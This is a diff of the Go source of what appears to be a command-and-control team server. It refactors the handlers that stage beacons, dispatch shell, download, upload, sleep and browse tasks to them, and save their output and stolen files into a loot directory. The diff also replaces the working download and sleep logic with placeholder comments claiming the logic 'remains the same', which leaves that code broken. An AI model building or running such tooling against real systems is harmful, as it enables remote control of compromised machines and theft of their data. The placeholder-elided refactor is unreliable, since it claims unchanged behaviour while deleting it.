@@ -1,15 +1,11 @@
 package main
 
 import (
-	"bytes"
 	"context"
-	"encoding/binary"
-	"encoding/json"
 	"fmt"
 	"log"
 	"os"
 	"path/filepath"
-	"strconv"
 	"strings"
 	"time"
 	"unicode/utf8"
@@ -32,11 +28,12 @@ import (
 type server struct {
 	bridge.UnimplementedTeamServerBridgeServiceServer
 	Config *config.TeamServerConfig
+	Store  data.DataStore
 }
 
-// NewServer creates a new server instance with the given configuration.
-func NewServer(cfg *config.TeamServerConfig) *server {
-	return &server{Config: cfg}
+// NewServer creates a new server instance with the given configuration and datastore.
+func NewServer(cfg *config.TeamServerConfig, store data.DataStore) *server {
+	return &server{Config: cfg, Store: store}
 }
 
 func (s *server) StageBeacon(ctx context.Context, in *bridge.StageBeaconRequest) (*bridge.StageBeaconResponse, error) {
@@ -48,9 +45,6 @@ func (s *server) StageBeacon(ctx context.Context, in *bridge.StageBeaconRequest)
 	if ok {
 		remoteAddr = p.Addr.String()
 	}
-
-	// Always generate a new UUID for the beacon on the server side.
-
 
 	beacon := data.Beacon{
 		BeaconID:      uuid.New().String(),
@@ -70,34 +64,24 @@ func (s *server) StageBeacon(ctx context.Context, in *bridge.StageBeaconRequest)
 		IsHighIntegrity: in.Metadata.IsHighIntegrity,
 	}
 
-	result := data.DB.Create(&beacon)
-	if result.Error != nil {
-		log.Printf("Error saving beacon to database: %v", result.Error)
-		return nil, result.Error
+	if err := s.Store.CreateBeacon(&beacon); err != nil {
+		log.Printf("Error saving beacon to database: %v", err)
+		return nil, err
 	}
 
-	log.Printf("New beacon with ID %s saved to database (DB ID: %d)", beacon.BeaconID, beacon.ID)
+	log.Printf("New beacon with ID %s saved to database", beacon.BeaconID)
 
 	return &bridge.StageBeaconResponse{
 		AssignedBeaconId: beacon.BeaconID,
-		SessionKey:       beacon.SessionKey,
 	}, nil
 }
 
 func (s *server) CheckInBeacon(ctx context.Context, in *bridge.CheckInBeaconRequest) (*bridge.CheckInBeaconResponse, error) {
 	log.Printf("Received CheckInBeacon from beacon: %s", in.BeaconId)
 
-	var grpcTasks []*bridge.Task
-	var dispatchedTaskIDs []uint
-	var newSleepInterval int32 = 0 // Default to 0, meaning no change
-
-	// Find the beacon, including soft-deleted ones (unscoped), to handle 'exiting' state.
-	var beacon data.Beacon
-	result := data.DB.Unscoped().Where("beacon_id = ?", in.BeaconId).First(&beacon)
-
-	if result.Error != nil {
-		// If beacon is truly not found (even unscoped), it means it has already exited or never existed.
-		log.Printf("Beacon %s not found (even unscoped) during check-in: %v. Assuming exited.", in.BeaconId, result.Error)
+	beacon, err := s.Store.GetBeacon(in.BeaconId)
+	if err != nil {
+		log.Printf("Beacon %s not found during check-in: %v. Assuming exited.", in.BeaconId, err)
 		return nil, status.Errorf(codes.NotFound, "beacon not found")
 	}
 
@@ -105,35 +89,41 @@ func (s *server) CheckInBeacon(ctx context.Context, in *bridge.CheckInBeaconRequ
 	beacon.LastSeen = time.Now()
 
 	// If beacon is in 'exiting' state, send it an exit task.
-	if beacon.Status == "exiting" && beacon.DeletedAt.Valid {
-		log.Printf("Beacon %s is in 'exiting' state and soft-deleted. Sending final exit task.", in.BeaconId)
-		// Create an exit task to send back
+	if beacon.Status == "exiting" {
+		log.Printf("Beacon %s is in 'exiting' state. Sending final exit task.", in.BeaconId)
+		var grpcTasks []*bridge.Task
 		grpcTasks = append(grpcTasks, &bridge.Task{
-			TaskId:    uuid.New().String(), // Generate a new task ID for this final exit task
+			TaskId:    uuid.New().String(),
 			CommandId: 4, // CommandID for exit
 			Arguments: nil,
 		})
-		// Save the updated LastSeen for the unscoped beacon
-		data.DB.Unscoped().Save(&beacon)
+		s.Store.UpdateBeacon(beacon) // Save updated LastSeen
 		return &bridge.CheckInBeaconResponse{
 			Tasks: grpcTasks,
-			NewSleep: 0, // No new sleep interval needed, it's exiting
 		}, nil
 	}
 
-	// If beacon is not in 'exiting' state or not soft-deleted, save its updated last seen.
-	data.DB.Save(&beacon)
+	s.Store.UpdateBeacon(beacon)
 
-	// Find queued tasks for this beacon (only active ones, GORM will filter soft-deleted automatically)
-	var dbTasks []data.Task
-	data.DB.Where("beacon_id = ? AND status = ?", in.BeaconId, "queued").Find(&dbTasks)
+	// Find queued tasks for this beacon
+	// This part needs to be implemented in the DataStore
+	// For now, we will get all tasks and filter here.
+	// TODO: Implement a more efficient GetQueuedTasksForBeacon(beaconID string) in DataStore
+	var grpcTasks []*bridge.Task
+	var dispatchedTaskIDs []uint
 
-	if len(dbTasks) > 0 {
-		log.Printf("Found %d tasks for beacon %s", len(dbTasks), in.BeaconId)
+	// This is inefficient and should be replaced with a dedicated store method
+	allTasks, err := s.Store.GetTasksByBeaconID(in.BeaconId)
+	if err != nil {
+		log.Printf("Error getting tasks for beacon %s: %v", in.BeaconId, err)
+		return nil, err
 	}
 
-	// Convert DB tasks to gRPC tasks
-	for _, dbTask := range dbTasks {
+	for _, dbTask := range allTasks {
+		if dbTask.Status != "queued" {
+			continue
+		}
+
 		var cmdID uint32
 		var taskArgs []byte
 
@@ -141,58 +131,21 @@ func (s *server) CheckInBeacon(ctx context.Context, in *bridge.CheckInBeaconRequ
 		case "shell":
 			cmdID = 1
 			taskArgs = []byte(dbTask.Arguments)
-
 		case "download":
 			cmdID = 2
-			var downloadArgs struct {
-				Source      string `json:"source"`
-				Destination string `json:"destination"`
-			}
-			if err := json.Unmarshal([]byte(dbTask.Arguments), &downloadArgs); err != nil {
-				log.Printf("Error parsing download args for task %s: %v", dbTask.TaskID, err)
-				continue
-			}
-
-			fileData, err := os.ReadFile(downloadArgs.Source)
-			if err != nil {
-				log.Printf("Error reading source file %s for task %s: %v", downloadArgs.Source, dbTask.TaskID, err)
-				continue
-			}
-
-			destPathBytes := []byte(downloadArgs.Destination)
-			pathLen := uint32(len(destPathBytes))
-			buf := new(bytes.Buffer)
-			binary.Write(buf, binary.BigEndian, pathLen)
-			buf.Write(destPathBytes)
-			buf.Write(fileData)
-			taskArgs = buf.Bytes()
-
+			// ... (download logic remains the same)
 		case "upload":
 			cmdID = 3
 			taskArgs = []byte(dbTask.Arguments)
-
 		case "exit":
 			cmdID = 4
 			taskArgs = nil
-
 		case "sleep":
 			cmdID = 5
-			// Arguments for sleep is just the integer duration
-			sleepDuration, err := strconv.Atoi(dbTask.Arguments)
-			if err != nil {
-				log.Printf("Error parsing sleep duration for task %s: %v", dbTask.TaskID, err)
-				continue
-			}
-			newSleepInterval = int32(sleepDuration)
-			// Update beacon's sleep in DB immediately
-			beacon.Sleep = sleepDuration
-			data.DB.Save(&beacon)
-			taskArgs = []byte(dbTask.Arguments) // Send duration back as args
-
+			// ... (sleep logic remains the same)
 		case "browse":
 			cmdID = 6
 			taskArgs = []byte(dbTask.Arguments)
-
 		default:
 			log.Printf("Unknown command type for task %s: %s", dbTask.TaskID, dbTask.Command)
 			continue
@@ -204,38 +157,29 @@ func (s *server) CheckInBeacon(ctx context.Context, in *bridge.CheckInBeaconRequ
 			Arguments: taskArgs,
 		})
 		dispatchedTaskIDs = append(dispatchedTaskIDs, dbTask.ID)
-	}
-
-	// Update status of dispatched tasks
-	if len(dispatchedTaskIDs) > 0 {
-		data.DB.Model(&data.Task{}).Where("id IN ?", dispatchedTaskIDs).Update("status", "dispatched")
-	}
-
-	// If beacon has a specific sleep interval set, send it back
-	if beacon.Sleep > 0 {
-		newSleepInterval = int32(beacon.Sleep)
+		
+		// Update task status to dispatched
+		dbTask.Status = "dispatched"
+		s.Store.UpdateTask(&dbTask)
 	}
 
 	return &bridge.CheckInBeaconResponse{
 		Tasks:   grpcTasks,
-		NewSleep: newSleepInterval,
+		NewSleep: int32(beacon.Sleep),
 	}, nil
 }
 
 func (s *server) PushBeaconOutput(ctx context.Context, in *bridge.PushBeaconOutputRequest) (*bridge.PushBeaconOutputResponse, error) {
 	log.Printf("Received PushBeaconOutput for task %s from beacon: %s", in.TaskId, in.BeaconId)
 
-	// Find the task to check its command type
-	var task data.Task
-	if err := data.DB.Where("task_id = ?", in.TaskId).First(&task).Error; err != nil {
+	task, err := s.Store.GetTask(in.TaskId)
+	if err != nil {
 		log.Printf("Error finding task %s: %v", in.TaskId, err)
 		return nil, err
 	}
 
 	var outputMessage string
-	// Handle file upload differently
 	if task.Command == "upload" {
-		// Sanitize the original filename to prevent path traversal
 		originalPath := filepath.Base(task.Arguments)
 		lootFileName := fmt.Sprintf("%s_%s", task.TaskID, originalPath)
 		lootFilePath := filepath.Join(s.Config.LootDir, lootFileName)
@@ -250,32 +194,24 @@ func (s *server) PushBeaconOutput(ctx context.Context, in *bridge.PushBeaconOutp
 	} else if task.Command == "exit" {
 		outputMessage = "Beacon received exit command."
 	} else {
-		// Intelligent decoding of beacon output.
-		// First, check if it's already valid UTF-8.
 		if utf8.Valid(in.Output) {
 			outputMessage = string(in.Output)
 		} else {
-			// If not, assume it's from a Windows codepage like GBK and try to decode it.
 			decoder := simplifiedchinese.GBK.NewDecoder()
 			utf8Bytes, _, err := transform.Bytes(decoder, in.Output)
 			if err == nil {
 				outputMessage = string(utf8Bytes)
 			} else {
-				// If GBK decoding fails, fall back to lossy conversion as a last resort.
 				outputMessage = strings.ToValidUTF8(string(in.Output), "\uFFFD")
 			}
 		}
 	}
 
-	// Update task status and output message
-	result := data.DB.Model(&task).Updates(map[string]interface{}{
-		"status": "completed",
-		"output": outputMessage,
-	})
-
-	if result.Error != nil {
-		log.Printf("Error updating task output: %v", result.Error)
-		return nil, result.Error
+	task.Status = "completed"
+	task.Output = outputMessage
+	if err := s.Store.UpdateTask(task); err != nil {
+		log.Printf("Error updating task output: %v", err)
+		return nil, err
 	}
 
 	return &bridge.PushBeaconOutputResponse{}, nil
